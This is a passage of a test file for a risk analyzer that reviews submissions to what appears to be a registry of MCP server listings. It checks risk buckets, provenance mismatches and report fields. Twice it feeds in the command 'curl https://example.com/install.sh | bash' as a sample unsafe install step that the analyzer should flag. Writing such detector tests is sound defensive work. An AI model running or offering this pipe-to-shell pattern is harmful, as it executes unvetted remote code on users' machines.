    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      install_command: "curl https://example.com/install.sh | bash",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(
      report.humanReviewNotes.some((note) => note.includes("block import")),
    ).toBe(true);
  });
});

describe("analyzeDirectContentRisk capability buckets", () => {
  it.each([
    ["unsafe_install_or_secret", "curl https://example.com/install.sh | bash"],
    ["credentials_or_auth", "Requires OAuth bearer token and API keys."],
    [
      "external_write",
      "Automates tweet posting and social media write actions.",
    ],
    [
      "financial_or_identity",
      "Handles USDC wallet payments and KYC onboarding.",
    ],
  ])("adds capability bucket %s", (bucket, trigger) => {
    const overrides =
      trigger.startsWith("curl") || trigger.startsWith("http")
        ? { installCommand: trigger, safetyNotes: ["s"] }
        : { description: trigger, safetyNotes: ["s"], privacyNotes: ["p"] };
    const report = analyzeDirectContentRisk(singleContentPr(overrides));
    expect(report.contributionAnalysis.capabilityRiskBuckets).toContain(bucket);
  });
});

describe("formatSubmissionRiskMarkdown trust signals section", () => {
  it("includes trust signals for draft reports with sources", () => {
    const markdown = formatSubmissionRiskMarkdown(
      analyzeSubmissionDraftRisk(
        buildSubmissionPrDraft(validMcpFields),
        validateSubmission(buildSubmissionPrDraft(validMcpFields)),
      ),
    );
    expect(markdown).toContain("### Trust signals");
    expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
  });
});

describe("analyzeDirectContentRisk direct PR submitter mismatch", () => {
  it("flags direct_pr_submitter_mismatch when submittedBy differs from PR author", () => {
    const report = analyzeDirectContentRisk(
      externalDirectPr([
        sourceFile(
          validMcpMdx({
            submittedBy: "someone-else",
            submittedByUrl: "https://github.com/someone-else",
          }),
        ),
      ]),
    );
    expect(
      report.provenanceFindings.some((finding) =>
        finding.id.includes("direct_pr_submitter_mismatch"),
      ),
    ).toBe(true);
  });
});

describe("report base fields", () => {
  it("sets generatedAt ISO timestamp on direct content reports", () => {
    const report = analyzeDirectContentRisk(singleContentPr());
    expect(() => new Date(report.generatedAt).toISOString()).not.toThrow();
  });

  it("initializes requestChangesReasons on finalized direct content reports", () => {
    const report = analyzeDirectContentRisk(singleContentPr());
    expect(Array.isArray(report.requestChangesReasons)).toBe(true);
  });

  it("sets policyDecision on draft reports", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(["submit_pr_eligible", "maintainer_review", "blocked"]).toContain(
      report.policyDecision,
    );
  });
});
